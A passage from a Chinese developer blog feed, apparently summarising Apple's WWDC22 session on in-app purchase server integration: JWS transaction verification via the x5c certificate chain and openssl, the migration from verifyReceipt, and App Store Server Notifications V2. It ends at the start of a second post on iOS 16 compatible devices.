AuthKey_<span class="number">123</span>ABC<span class="number">456</span>.p<span class="number">8</span> -pubout -out AuthKey_<span class="number">123</span>ABC<span class="number">456</span>_public.p<span class="number">8</span></span><br></pre></td></tr></table></figure><p>然后可以在 <a href="https://jwt.io/">jwt.io</a> 网站选择 <code>ES256</code> 算法后，复制 JWT token 和公钥文件的内容到网页，就可以看到验证结果。</p><p><img src="https://ihtcboy.com/images/WWDC22_session_10040_15.png" alt="WWDC22_session_10040_15"></p><p>关于 App Store Server API 请求的细节，可以参考苹果文档 <a href="https://developer.apple.com/documentation/appstoreconnectapi/generating_tokens_for_api_requests">Generating Tokens for API Requests</a>，或这篇实践教程 <a href="https://juejin.cn/post/7056976669139009573">App Store Server API 实践总结</a>。</p><h3 id="校验签名的-transactions（交易票据）"><a href="#校验签名的-transactions（交易票据）" class="headerlink" title="校验签名的 transactions（交易票据）"></a>校验签名的 transactions（交易票据）</h3><p>WWDC21 推出的 StoreKit 2 的交易票据（receipt）是使用 JWS(JSON Web Signature) 格式签名。JWS 表示签名过的 JWT，也就是说，可以通过 JWS 验证信息是否被篡改，用于验证内容的真实性。关于 JWS transaction 的校验，其实从去年开始就有非常多的开发者吐槽，不知道如何校验：</p><ul><li><a href="https://developer.apple.com/forums/thread/691464">Validate StoreKit2 in-app purchase… | Apple Developer Forums</a></li><li><a href="https://developer.apple.com/forums/thread/693351">App Store Notifications v2 - Verif… | Apple Developer Forums</a></li><li><a href="https://stackoverflow.com/questions/69438848/validate-apple-storekit2-in-app-purchase-receipt-jwsrepresentation-in-backend-n">iOS - Validate Apple StoreKit2 in-app purchase receipt jwsRepresentation in backend - Stack Overflow</a></li></ul><p>现在苹果对验证 StoreKit 2 已签名的交易票据（JWS transactions）进行了详细的解答，大概分为三步：</p><p><img src="https://ihtcboy.com/images/WWDC22_session_10040_16.png" alt="WWDC22_session_10040_16"></p><ul><li>具体 JWT 的格式，先用 Base64 解码 header 获取签名信息</li><li>使用 header 解码中的 <code>alg</code> 字段确定使用的签名算法 </li><li>验证 header 解码中的 <code>x5c</code> 确认签名的证书链</li></ul><p><img src="https://ihtcboy.com/images/WWDC22_session_10040_18.png" alt="WWDC22_session_10040_18"></p><p>首先 <code>x5c</code>表示 X509 证书链，X.509 是一种证书标准，主要定义了证书中应该包含哪些内容。其详情可以参考 <a href="https://datatracker.ietf.org/doc/html/rfc5280">RFC5280</a>，SSL 使用的就是这种证书标准。同样的 X.509 证书，可能有不同的编码格式，目前有以下两种编码格式：</p><ul><li>DER：Distinguished Encoding Rules，打开看是二进制格式，不可读.</li><li>PEM：Privacy Enhanced Mail，打开看文本格式，以 <code>—–BEGIN…</code> 开头，<code>—–END…</code> 结尾，内容是 BASE64 编码。</li></ul><p>那么 x5c 证书链成功验证，就表示这个签名的 JWS 是可信的，所以，x5c 证书链的规范如下：</p><p><img src="https://ihtcboy.com/images/WWDC22_session_10040_17.png" alt="WWDC22_session_10040_17"></p><ul><li>每个证书都由前一个证书签名</li><li>最开头的证书是根证书，是苹果的证书 <a href="https://www.apple.com/certificateauthority/AppleRootCA-G3.cer">Apple Root CA - G3 Root</a></li><li>最后一个证书叫叶证书，用于签名 JWS </li></ul><p>所以，x5c 证书链的生成，简单来说，苹果的根证书（只能从苹果下载，相当于信任）签名包含了中间的证书，中间的证书签名包含了叶证书，而叶证书就是签名 JWS 内容的证书。证书链签名规则如下：<br><img src="https://ihtcboy.com/images/WWDC22_session_10040_19.png" alt="WWDC22_session_10040_19"></p><p>所以验证 x5c 证书链，就是反过来，我们验证叶证书是由中间签名证书签名的，然后确保中间签名证书是由根证书签名的，最后，根证书与 Apple 证书颁发机构提供的证书相匹配。如果这些步骤都验证成功，则整个 x5c 链验证就可以认为是合法的证书链。如果有证书不匹配，则不应该信任该链。<br><img src="https://ihtcboy.com/images/WWDC22_session_10040_20.png" alt="WWDC22_session_10040_20"></p><p>原理讲清楚后，那么我们应该怎么验证证书链呢？最简单的方法是使用 OpenSSL 命令验证 x5c 证书链。具体命令的参数 <code>-trusted</code> 带上信任的根证书，这里是苹果的 <a href="https://www.apple.com/certificateauthority/AppleRootCA-G3.cer">Apple Root CA - G3 Root</a>，可以在苹果网站下载 <a href="https://www.apple.com/certificateauthority/">Apple PKI</a> 证书。参数 <code>-untrusted</code> 就是中间证书和叶证书。</p><p>执行这个 <code>openssl verify -trusted xxx.pem -untrusted xxx.pem leaf.pem</code> 后，根据返回的结果码判断，如果表示验证不成功，则此 JWS 数据可能被篡改且不应使用。</p><p><img src="https://ihtcboy.com/images/WWDC22_session_10040_21.png" alt="WWDC22_session_10040_21"></p><blockquote><p>注：苹果网站下载的 AppleRootCA-G3 是 <code>.cer</code> 格式，需要把 .cer 转换成 .pem 格式，转换命令： <code>openssl x509 -inform der -in AppleRootCA-G3.cer -out AppleRootCA-G3.pem</code></p></blockquote><p>这里补充说明一下，在苹果 <a href="https://www.apple.com/certificateauthority/">Apple PKI</a> 证书网页有四个苹果根证书，为什么使用 AppleRootCA-G3 这个根证书呢？</p><table><thead><tr><th>证书</th><th>证书组织</th><th>签名算法</th></tr></thead><tbody><tr><td><a href="https://www.apple.com/appleca/AppleIncRootCertificate.cer">Apple Inc. Root</a></td><td>Apple Inc.</td><td>带 RSA 加密的 SHA-1</td></tr><tr><td><a href="https://www.apple.com/certificateauthority/AppleComputerRootCertificate.cer">Apple Computer, Inc. Root</a></td><td>Apple Computer, Inc.</td><td>带 RSA 加密的 SHA-1</td></tr><tr><td><a href="https://www.apple.com/certificateauthority/AppleRootCA-G2.cer">Apple Root CA - G2 Root</a></td><td>Apple Inc.</td><td>带 RSA 加密的 SHA-384</td></tr><tr><td><a href="https://www.apple.com/certificateauthority/AppleRootCA-G3.cer">Apple Root CA - G3 Root</a></td><td>Apple Inc.</td><td>带 SHA-384 的 ECDSA 签名</td></tr></tbody></table><p>所以从表格可以看出，因为苹果 JWS 使用 <code>ES256</code> 算法，所以只能使用 AppleRootCA-G3 这个根证书。另外大家可能看到 <code>Apple Computer, Inc.</code>，因为 2007 MacWorld 大会上，乔布斯亲自推出传闻已久的 iPhone 手机，为消除公司只生产电脑的形象，将 <code>苹果电脑公司</code> 改名为 <code>苹果公司</code>，所以这个根证书还保留着（目前这个证书有效期是 2005 年至 2025 年），不清楚过期后苹果还否会更新这个证书呢？</p><p>验证了 x5c 证书链，还要用叶证书，验证一下 JWS 签名内容是否正确，至此签名验证成功后，就表示 JWS 内容可信。示例代码如下：<br><img src="https://ihtcboy.com/images/WWDC22_session_10040_22.png" alt="WWDC22_session_10040_22"></p><blockquote><p>关于验证 JWS 的第三方库，可以参考 jwt.io <a href="https://jwt.io/libraries">JSON Web Token Libraries</a>。</p></blockquote><h3 id="从-StoreKit-的-verifyReceipt-迁移到-App-Store-Server-API"><a href="#从-StoreKit-的-verifyReceipt-迁移到-App-Store-Server-API" class="headerlink" title="从 StoreKit 的 verifyReceipt 迁移到 App Store Server API"></a>从 StoreKit 的 verifyReceipt 迁移到 App Store Server API</h3><p>接下来，我们回顾一下，从 Original StoreKit 的 verifyReceipt 接口迁移到 App Store Server API 的使用案例。</p><p><img src="https://ihtcboy.com/images/WWDC22_session_10040_23.png" alt="WWDC22_session_10040_23"></p><ul><li>检查订阅状态的变化</li><li>Original StoreKit：调用 verifyReceipt 接口，根据 latest_receipt 字段判断状态</li><li>StoreKit 2：调用 Get Subscription Status 接口查询</li></ul><p>所以，获取订阅品项的最新状态的交互流程如图：<br><img src="https://ihtcboy.com/images/WWDC22_session_10040_24.png" alt="WWDC22_session_10040_24"></p><p>通过 App Store Server API 的 <code>/inApps/v1/subscriptions/&#123;originalTransactionId&#125;</code> 接口获取订阅品项的最新状态，包含最新的签名交易票据和续订更新信息等。</p><p>接下来，我们来看获取最新交易状态的案例。获取最新交易票据，可以知道用户购买了什么品项、订阅了什么品项，或者续订了什么品项等。<br><img src="https://ihtcboy.com/images/WWDC22_session_10040_25.png" alt="WWDC22_session_10040_25"><br>对于用户来说，交易票据的状态获取有两种情况：</p><ul><li>Original StoreKit：通过 verifyReceipt 接口返回的 <code>in_app</code> 和 <code>latest_receipt_info</code> 获取</li><li>StoreKit 2：通过 App Store Server API 的 <code>Get transaction History</code> 接口条件过滤获取</li></ul><blockquote><p>App Store Server API 的条件过滤功能，可以参考 <a href="https://developer.apple.com/videos/play/wwdc2022/10007">What’s new with in-app purchase - WWDC22</a>。</p></blockquote><p>所以，获取最新交易票据状态的交互流程如图：<br><img src="https://ihtcboy.com/images/WWDC22_session_10040_26.png" alt="WWDC22_session_10040_26"></p><blockquote><p>如果读者想进一步了解这个流程的客户端代码具体该如何实现，可以参考 <a href="https://developer.apple.com/videos/play/wwdc2022/10043">What’s new in App Store Connect - WWDC22</a></p></blockquote><p>最后，我们来说一下 <code>appAccountToken</code> 的更新。<code>appAccountToken</code> 字段是 StoreKit 2 交易票据提供的开发者 app 与用户绑定关联的 UUID。在已签名的交易票据、已签名的续订和该交易的苹果服务器通知中都会包含。</p><p>以前的 Original StoreKit 是不支持 appAccountToken 字段，因为它是 StoreKit2 的新功能。而现在，苹果增加了对 Original StoreKit 中的 <code>applicationUsername</code> 字段中提供 UUID 支持，从而让服务端不需要区分 Original StoreKit 还是 StoreKit 2，都可以支持 appAccountToken 所做的逻辑功能。详细的更新介绍，可以参考文章 <a href="https://mp.weixin.qq.com/s/ZslPiqGmC6B8OfgwZeasrw">苹果内购录：关于透传字段的一些讨论</a>。</p><p><img src="https://ihtcboy.com/images/WWDC22_session_10040_27.png" alt="WWDC22_session_10040_27"></p><p>以上就是本次 session 关于 App Store Server API 部分的更新。</p><p>接下来，我们讲解 App Store Server Notifications 内容的更新。</p><h2 id="App-Store-Server-Notifications"><a href="#App-Store-Server-Notifications" class="headerlink" title="App Store Server Notifications"></a>App Store Server Notifications</h2><p>关于 App Store Server Notifications 的内容，将从以下四方面进行讲解：</p><ul><li>配置 App Store Server Notifications</li><li>迁移到 App Store Server Notifications V2</li><li>恢复 App Store Server Notifications</li><li>通过 App Store Server Notifications 获得洞察力</li></ul><p><img src="https://ihtcboy.com/images/WWDC22_session_10040_28.png" alt="WWDC22_session_10040_28"></p><p>首先，App Store Server Notifications V2 兼容 Original StoreKit，并且全面支持应用内购买数据。详细的更新内容，可以参考我们之前的文章：<a href="https://mp.weixin.qq.com/s/dWsRKRJsYMRl0GX_36T-kg">IAP 后台通信优化与实践</a>。</p><p><img src="https://ihtcboy.com/images/WWDC22_session_10040_29.png" alt="WWDC22_session_10040_29"></p><h3 id="配置-App-Store-Server-Notifications"><a href="#配置-App-Store-Server-Notifications" class="headerlink" title="配置 App Store Server Notifications"></a>配置 App Store Server Notifications</h3><p>如何配置 App Store Server Notifications 来接收通知，可以在 App Store Connect 中的应用页面，看到配置的部分：<br><img src="https://ihtcboy.com/images/WWDC22_session_10040_30.png" alt="WWDC22_session_10040_30"></p><p>可以分别配置生产和沙盒环境的回调通知链接，然后每个链接的配置，可以设置 V1 或 V2 版本的通知。<br><img src="https://ihtcboy.com/images/WWDC22_session_10040_31.png" alt="WWDC22_session_10040_31"></p><blockquote><p>这里建议如果开发者现在使用的是 V1 版本的通知，迁移到 V2 版本前，先配置一个沙盒环境的 V2 链接进行测试，测试通过后，再切换到生产环境的 V2 版本。</p></blockquote><p>接口通知的链接，需要注意服务器配置：<br><img src="https://ihtcboy.com/images/WWDC22_session_10040_32.png" alt="WWDC22_session_10040_32"></p><ul><li>有效的 HTTPS 证书</li><li>允许 Apple 的公共 IP 段（17.0.0.0/8）访问您的服务器</li><li>使用 Test Notification API 来测试通知接口（测试接口，下文会讲到）</li></ul><p>App Store Server Notifications V2 版本通知的内容是 JWS 格式，所以需要验证签名：<br><img src="https://ihtcboy.com/images/WWDC22_session_10040_33.png" alt="WWDC22_session_10040_33"></p><p>签名证书验证可信后，可以读取 payload 的内容：<br><img src="https://ihtcboy.com/images/WWDC22_session_10040_34.png" alt="WWDC22_session_10040_34"></p><p>这个内容字段，需要开发者注意一下，<code>notificationUUID</code> 字段是每个通知的唯一标识符，如果服务器重试通知，则重试通知包含相同的 notificationUUID，有助于开发者服务器处理了通知但没有及时响应时接到到重复通知内容的情况。<code>signedDate</code> 字段是每个通知的创建时间，这对于检测重试通知也特别有用，具体作用下文会讲解。<code>appAppleId</code> 和 <code>bundleId</code> 可以用于验证 app 是否为开发者的。</p><h3 id="迁移到-App-Store-Server-Notifications-V2"><a href="#迁移到-App-Store-Server-Notifications-V2" class="headerlink" title="迁移到 App Store Server Notifications V2"></a>迁移到 App Store Server Notifications V2</h3><p>App Store Server Notifications V1 版本虽然现在还可以使用，但是苹果强烈建议开发者升级迁移到 App Store Server Notifications V2，因为 V2 版本增加了更多的状态通过，并且是支持 Original StoreKit 版本，完成是兼容性迁移，不会很麻烦，收益也更好。具体 V1 和 V2 的区别和优劣势，可以参考文章：<a href="https://mp.weixin.qq.com/s/dWsRKRJsYMRl0GX_36T-kg">IAP 后台通信优化与实践</a>。</p><p><img src="https://ihtcboy.com/images/WWDC22_session_10040_35.png" alt="WWDC22_session_10040_35"></p><p>App Store Server Notifications V2 增加了新的类型和添加新的子类型字段，从而提高所提供的通知场景更加详细并扩展更多的情景，以下这个示例就是订阅品项的生命周期的每一步提供通知：<br><img src="https://ihtcboy.com/images/WWDC22_session_10040_36.png" alt="WWDC22_session_10040_36"></p><p>上面这个流程图，我们假设一个用户订阅成功后，开发者可能收到 <code>SUBSCRIBED</code> 类型和带有 <code>INITIAL_BUY</code> 子类型的通知，或者用户使用了优惠订阅，则收到 <code>OFFER_REDEEMED</code> 类型和带有 <code>INITIAL_BUY</code> 子类型的通知，通知中包含首次交易的票据和订阅的续订信息。</p><p>时间流逝，用户一直订阅续订，所以一直处于续订状态（Renewing subscription）。每次续订时，苹果都会发送一个 <code>DID_RENEW</code> 通知，其中包含新的（支付成功）的交易票据。而当用户停用自动续订时，订阅进入即将到期的订阅状态时（Expiring subscription），开发者将收到 <code>DID_CHANGE_RENEWAL_STATUS</code> 类型和带有 <code>AUTO_RENEW_DISABLED</code> 子类型的通知。最后，如果用户不重新启用自动续订，则在订阅到期时，订阅会进入过期状态（Expired），开发者将收到 <code>EXPIRED</code> 类型和带有 <code>VOLUNTARY</code> 子类型的通知。</p><p>还有 <code>Pending price increase</code>（订阅涨价）、<code>Grace period enabled?</code>（启用宽限期）/ <code>Grace period</code>（账单宽限期）、<code>Billing retry</code>（扣费重试）等通知，另外这个流程图没有展示订阅退款通知和订阅撤销通知等场景。</p><p>所以可以感受到，App Store Server Notifications V2 通知覆盖了大量场景，可以通知开发者订阅品项的生命周期的每个步骤，苹果也在努力覆盖更多的过渡状态，希望给开发者提供更有价值的通知。最后，关于 App Store Server Notifications 全部的通知类型，可以阅读苹果 <a href="https://developer.apple.com/documentation/appstoreservernotifications">App Store Server Notifications</a> 文档。</p><h3 id="恢复-App-Store-Server-Notifications"><a href="#恢复-App-Store-Server-Notifications" class="headerlink" title="恢复 App Store Server Notifications"></a>恢复 App Store Server Notifications</h3><p>App Store Server Notifications 是开发者被动接收通知，所以总会有开发者的服务器出现故障的情况，时间可能是几分钟，甚至是几天。所以总有错过接收通知的情况，所以，现在我们可以通过一些方法来解决这个问题了！</p><p>例如你的服务器，接到到 1 和 2 的通知，然后服务器宕机等，导致 3、4、5 通知无法接收，然后服务器恢复了，接收到 6 通知，然后 3 和 4 通知可能会晚于 6 通知，5 晚于 7 通知等情况。<br><img src="https://ihtcboy.com/images/WWDC22_session_10040_37.png" alt="WWDC22_session_10040_37"></p><p>那么针对上述这种情况，有几种方法可以处理。</p><p>首先，苹果将 App Store Server Notifications V2 通知的重试策略进行了调整，在首次尝试通知后没有收到来自开发者服务器的 200 回复时，则会按如下方式重试：：</p><ul><li>App Store Server Notifications V1：重试三次；在上次尝试后 6、24 和 48 小时。</li><li>App Store Server Notifications V2：重试五次；在上次尝试后 1、12、24、48 和 72 小时。</li></ul><p>增加了两次重试次数，并且时间缩短到第一次重试为 1 小时后，对于开发者来说，一般的服务器故障能在一小时内容恢复，所以一小时后重试更加有效。</p><p>这里就有一个疑问，如何检测通知是原始通知还是重试通知？开发者可以检查通知里的 <code>signedDate</code> 字段，它表示通知的签名时间，也就是说通知发送的时间，通过对比通知里的这个字段与当前接收到的时间，就知道这个通知是否为重试通知。</p><p><img src="https://ihtcboy.com/images/WWDC22_session_10040_38.png" alt="WWDC22_session_10040_38"></p><p>比如，通知 6 和通知 3，服务器先收到 6 通知，并不意味着 6 比 3 通知早。比如通知 6 是用户取消订阅，通知 3 是用户续订订阅，所以开发者要通过 <code>signedDate</code> 字段，确保通知的顺序逻辑正确。<br><img src="https://ihtcboy.com/images/WWDC22_session_10040_39.png" alt="WWDC22_session_10040_39"></p><p>另外通知会重试，所以可能会存在重复通知的情况，所以请务必检查通知的 <code>notificationUUID</code> 字段，如果发现重复的 UUID，可以删除这些重复数据。<br><img src="https://ihtcboy.com/images/WWDC22_session_10040_40.png" alt="WWDC22_session_10040_40"></p><p>最后，我们来看看 App Store Server API 今年新推出的 <code>Get Notification History</code>（获取通知历史记录） API，它提供了六个月内的苹果服务器发送通知的历史记录查询。关于这个 API 的详细介绍，可以参考 <a href="https://developer.apple.com/videos/play/wwdc2022/10007">What’s new with in-app purchase - WWDC22</a>。</p><p><strong>获取通知历史记录接口</strong>允许在特定时间跨度内进行查询，比如开发者服务器宕机解决后，可以使用开始和结束时间戳来查询宕机期间所有未接收到的通知。查询时间参数格式如下：<br><img src="https://ihtcboy.com/images/WWDC22_session_10040_41.png" alt="WWDC22_session_10040_41"></p><p>当然，考虑到宕机时间如果很久，可能会有很多未接收的通知，所以也可以指定具体的通知类型进行过滤。比如 <code>notificationType</code> 设置为 <code>DID_RENEW</code> 通知类型来查询订单更新的通知。<br><img src="https://ihtcboy.com/images/WWDC22_session_10040_42.png" alt="WWDC22_session_10040_42"></p><p>最后，还可能通过 <code>originalTransactionId</code> 过滤到特定用户。<br><img src="https://ihtcboy.com/images/WWDC22_session_10040_43.png" alt="WWDC22_session_10040_43"></p><p>通过 <code>Get Notification History</code>（通知历史记录）接口，可以方便开发者获取到错过的通知，当处理用户反馈订阅状态与预期不同时，获取通知历史记录在客户支持中也非常有帮助。最后回顾一下接口的返回内容，这里简单起见，只列出部分字段内容：<br><img src="https://ihtcboy.com/images/WWDC22_session_10040_44.png" alt="WWDC22_session_10040_44"></p><p>可以看到 <code>notificationHistory</code> 数组中每一条就是一个通知，<code>signedPayload</code> 就是签名的 JWS 通知内容，<code>firstSendAttemptResult</code> 字段表示苹果服务器记录的初始通知的响应结果，比如通知成功的情况下，这个值是 <code>SUCCESS</code>，但是可能开发者服务器配置或者宕机等，会有不同的值，比如我们这里的 <code>SSL_ISSUE</code>，表示开发者服务器的 SSL 证书或进程存在问题。所以，除了看到通知未发送成功之外，此字段还提高了诊断服务器问题的可见性。</p><p><img src="https://ihtcboy.com/images/WWDC22_session_10040_45.png" alt="WWDC22_session_10040_45"><br>所以，如果开发者刚刚接入 App Store Server Notifications，那么开发者服务器并没有用户之前的通知历史记录，那么就可以使用 <code>Get Notification History</code> 接口获取之前的通知历史记录，这也是接口的作用之一。</p><p>另外，苹果新提供的 <code>Get Test Notification Status</code> API 也具有相同的 <code>firstSendAttemptResult</code> 字段，方便测试通知时诊断。详细可以参考 <a href="https://developer.apple.com/videos/play/wwdc2022/10007">What’s new with in-app purchase - WWDC22</a>。</p><h3 id="通过-App-Store-Server-Notifications-获得洞察力"><a href="#通过-App-Store-Server-Notifications-获得洞察力" class="headerlink" title="通过 App Store Server Notifications 获得洞察力"></a>通过 App Store Server Notifications 获得洞察力</h3><p>最后让我们来了解一下，怎么通过通知了解用户购买或取消的原因，从中洞察商业机会。比如 App Store Server Notifications V2 提供了一些新的通知子类型，比如 <code>EXPIRED</code> 或 <code>DID_CHANGE_RENEWAL_STATUS</code>。</p><p>例如 <code>EXPIRED</code> 类型，开发者一般收到通知后，会将用户的订阅标记为过期并撤销对产品服务的访问权限。但是，<strong>了解用户过期的原因通常很有用</strong>。是由于扣费问题、自愿取消还是订阅价格上涨？</p><p>另一个通知 <code>DID_CHANGE_RENEWAL_STATUS</code> 也是获得额外信息和机会的一个很好的例子。表面上收到这个通知，表示用户的订阅状态更新了，表面上开发者不需要采取任何的操作，相比 EXPIRED 通知，优先级可能更低，但这往往是错误的理解！这个通知是一个机会！</p><p>首先，此通知是尝试在订阅到期之前赢回客户的绝佳机会。特别是由于停用自动续订可能发生在 app 之外，这可能是在到期日期之前续订状态更改通知的另一个唯一触发的通知。</p><p>此外，这个通知还提供对客户行为的洞察。可用于确定订阅者在续订期间何时取消。是订阅到期前一天吗？新订阅者是否会在注册您的服务后立即停用自动续订？此类信息对于了解取消的原因和改进您的产品非常重要。</p><p><img src="https://ihtcboy.com/images/WWDC22_session_10040_46.png" alt="WWDC22_session_10040_46"></p><p>最后，某些场景可能永远不会有通知，但是通过查询用户的订单历史中有记录。例如，用户可以在订阅期到期之前停用但随后重新激活自动续订，由于这一切都发生在订阅期内，因此不会影响订阅的长期状态，所以可能不会有通知。</p><p>总体而言，App Store Server Notifications V2 通知通过在用户订阅周期的每一步提供信息来增强和创造了解客户行为的机会，覆盖比以往更多的场景。</p><h3 id="Wrap-up（小结）"><a href="#Wrap-up（小结）" class="headerlink" title="Wrap-up（小结）"></a>Wrap-up（小结）</h3><p><img src="https://ihtcboy.com/images/WWDC22_session_10040_47.png" alt="WWDC22_session_10040_47"></p><p>最后，总结一下今天的内容：</p><ul><li>提供改进管理和跟踪 IAP 的能力。</li><li>适用于所有的客户端，兼容 Original StoreKit 和 v2 版本，并提高监控订阅生命周期的能力。</li><li>以上功能在 Sandbox（沙盒） 和 Production（生产）环境中都可用，并且是开发者现有服务和系统的重要补充。</li></ul><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>从去年推出 StoreKit 2、App Store Server API 和 App Store Server Notifications V2，到今年的优化完善，都是开发者们一直以来期待的功能，现在苹果已逐步完善应用内购买（IAP），相信读者都有所感受。另外，随着应用市场的存量饱和，竞争越来越激烈，获取一个新用户或者挽留一个付费用户的成本很高，所以，苹果也希望开发者能根据这么新 API 的特性，尽早的推进服务端使用这些新的 Server API，对于获得用户的购买行为和感知体验，有更敏捷的洞察力和更准确的预流失风险评估等。总之，善待每一个用户，提升用户体验，是突出重围和赢得用户的绝佳方式。</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><a href="https://developer.apple.com/videos/play/wwdc2022/10040/">Explore in-app purchase integration and migration - WWDC22 - Videos - Apple Developer</a></li><li><a href="https://developer.apple.com/videos/play/wwdc2022/10007">What’s new with in-app purchase - WWDC22 - Videos - Apple Developer</a></li><li><a href="https://developer.apple.com/videos/play/wwdc2022/10043">What’s new in App Store Connect - WWDC22 - Videos - Apple Developer</a></li><li><a href="https://mp.weixin.qq.com/s/arA0_uyc4CWMQ7WJ2RanJA">初见 StoreKit 2</a></li><li><a href="https://mp.weixin.qq.com/s/dWsRKRJsYMRl0GX_36T-kg">IAP 后台通信优化与实践</a></li><li><a href="https://mp.weixin.qq.com/s/MtytymgkcP3_oAH7JyI1og">IAP 用户退款与客诉处理优化</a></li><li><a href="https://developer.apple.com/documentation/appstoreserverapi/creating_api_keys_to_use_with_the_app_store_server_api">Creating API Keys to Use With the App Store Server API | Apple Developer Documentation</a></li><li><a href="https://developer.apple.com/documentation/appstoreconnectapi/generating_tokens_for_api_requests">Generating Tokens for API Requests | Apple Developer Documentation</a></li><li><a href="https://jwt.io/">JSON Web Tokens - jwt.io</a></li><li><a href="https://jwt.io/libraries">JSON Web Token Libraries - jwt.io</a></li><li><a href="https://jishuin.proginn.com/p/763bfbd6c8bc">你真的了解 JWT？这篇刷新你的认知！</a></li><li><a href="https://onevcat.com/2018/12/jose-1/">与 JOSE 战斗的日子 - 写给 iOS 开发者的密码学入门手册 (基础) | OneV’s Den</a></li><li><a href="https://juejin.cn/post/7056976669139009573">WWDC21 - App Store Server API 实践总结</a></li><li><a href="https://www.apple.com/certificateauthority/AppleRootCA-G3.cer">Apple Root CA - G3 Root</a></li><li><a href="https://www.apple.com/certificateauthority/">Apple PKI - Apple</a></li><li><a href="https://mp.weixin.qq.com/s/ZslPiqGmC6B8OfgwZeasrw">苹果内购录：关于透传字段的一些讨论</a></li><li><a href="https://developer.apple.com/documentation/appstoreservernotifications">App Store Server Notifications | Apple Developer Documentation</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;本文是《WWDC22 内参》参与创作者，首发于 &lt;a href=&quot;https://xiaozhuanlan.com/topic/8024563197&quot;&gt;【WWDC22 10040】 探索 In-App Purchase 集成和迁移 － 小专栏&lt;/a&gt;。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;基于 &lt;a href=&quot;https://developer.apple.com/videos/play/wwdc2022/10040/&quot;&gt;Session 10040&lt;/a&gt; 梳理&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;作者：iHTCboy，目前就职于三七互娱37手游，从事游戏 SDK 开发多年，对 IAP 和 SDK 架构设计有丰富的实践经验。&lt;/p&gt;
&lt;p&gt;审核：&lt;br&gt;黄骋志（橙汁），老司机技术社区核心成员，现于西瓜视频负责稳定性 OOM/Watchdog 相关工作。&lt;/p&gt;
&lt;p&gt;SeaHub，目前任职于腾讯 TEG 计费平台部，负责搭建服务于腾讯系业务的支付组件 SDK，对 IAP 相关内容及 SDK 设计开发有一定的经验。&lt;/p&gt;
&lt;p&gt;王浙剑（Damonwong），老司机技术社区负责人、WWDC22 内参主理人，目前就职于阿里巴巴。&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="technology" scheme="https://ihtcboy.com/categories/technology/"/>
    
    
    <category term="WWDC22" scheme="https://ihtcboy.com/tags/WWDC22/"/>
    
    <category term="In-App Purchase" scheme="https://ihtcboy.com/tags/In-App-Purchase/"/>
    
  </entry>
  
  <entry>
    <title>WWDC22 开发者需要关注的重点内容</title>
    <link href="https://ihtcboy.com/2022/06/11/2022-06-11_WWDC22%E5%BC%80%E5%8F%91%E8%80%85%E9%9C%80%E8%A6%81%E5%85%B3%E6%B3%A8%E7%9A%84%E9%87%8D%E7%82%B9%E5%86%85%E5%AE%B9/"/>
    <id>https://ihtcboy.com/2022/06/11/2022-06-11_WWDC22%E5%BC%80%E5%8F%91%E8%80%85%E9%9C%80%E8%A6%81%E5%85%B3%E6%B3%A8%E7%9A%84%E9%87%8D%E7%82%B9%E5%86%85%E5%AE%B9/</id>
    <published>2022-06-11T09:01:10.000Z</published>
    <updated>2022-12-31T15:24:06.918Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>本文首发于 <a href="https://juejin.cn/post/7107904852243513375">WWDC22 开发者需要关注的重点内容 - 掘金</a>，欢迎关注我们 <a href="https://juejin.cn/user/1002387318511214">@37手游iOS技术运营团队</a> 。</p></blockquote><p>作者：iHTCboy</p><blockquote><p>iOS 16 系统新特性，WWDC22 开发者，需要关注的重点内容、注意事项等，快速了解最新内容和需要适配的最新情况。</p></blockquote><span id="more"></span><h1 id="一、iOS-16"><a href="#一、iOS-16" class="headerlink" title="一、iOS 16"></a><strong>一、iOS 16</strong></h1><h2 id="1-1-iOS-16-兼容设备"><a href="#1-1-iOS-16-兼容设备" class="headerlink" title="1.1 iOS 16 兼容设备"></a>1.1 iOS 16 兼容设备</h2><p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/7c94ee8c1924465faacfe40408b31eb6~tplv-k3u1fbpfcp-watermark.image" alt="image.png"></p><ul><li>  iPhone 13</li><li>  iPhone 13 mini</li><li>  iPhone 13 Pro</li><li>  iPhone 13 Pro Max</li><li>  iPhone 12</li><li>  iPhone 12 mini</li><li>  iPhone 12 Pro</li><li>  iPhone 12 Pro Max</li><li>  iPhone 11</li><li>  iPhone 11 Pro</li><li>  iPhone 11 Pro Max</li><li>  iPhone XS</li><li>  iPhone XS Max</li><li>  iPhone XR</li><li>  iPhone X</li><li>  iPhone 8</li><li>  iPhone 8 Plus</li><li>  iPhone SE (第二代及后续机型)</li></ul><h2 id="1-2-iPadOS-16-兼容设备"><a href="#1-2-iPadOS-16-兼容设备" class="headerlink" title="1.2 iPadOS 16 兼容设备"></a>1.2 iPadOS 16 兼容设备</h2><p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/b188ff10e51e461093876ea6361cacbf~tplv-k3u1fbpfcp-watermark.image" alt="image.png"></p><ul><li>  iPad Pro (全部机型)</li><li>  iPad Air (第三代及后续机型)</li><li>  iPad (第五代及后续机型)</li><li>  iPad mini (第五代及后续机型)</li></ul><h2 id="1-3-系统更新内容"><a href="#1-3-系统更新内容" class="headerlink" title="1.3 系统更新内容"></a>1.3 系统更新内容</h2><p>从用户角度：</p><ul><li>  <a href="https://www.apple.com.cn/ios/ios-16-preview/">iOS 16 预览 - Apple (中国大陆)</a></li><li>  <a href="https://www.apple.com.cn/ipados/ipados-16-preview/">iPadOS 16 预览 - Apple (中国大陆)</a></li></ul><p>从开发者角色：</p><ul><li>  <a href="https://developer.apple.com/ios/">iOS 16 - Apple Developer</a></li><li>  <a href="https://developer.apple.com/ipados/">iPadOS 16 - Apple Developer</a></li></ul><p>系统详细更新日志：</p><ul><li>  <a href="https://developer.apple.com/documentation/ios-ipados-release-notes/ios-ipados-16-release-notes">iOS &amp; iPadOS 16 Beta Release Notes | Apple Developer Documentation</a></li></ul><h2 id="1-4-升级新系统"><a href="#1-4-升级新系统" class="headerlink" title="1.4 升级新系统"></a>1.4 升级新系统</h2><p>详细教程：</p><ul><li>  <a href="https://developer.apple.com/support/install-beta/">Apple 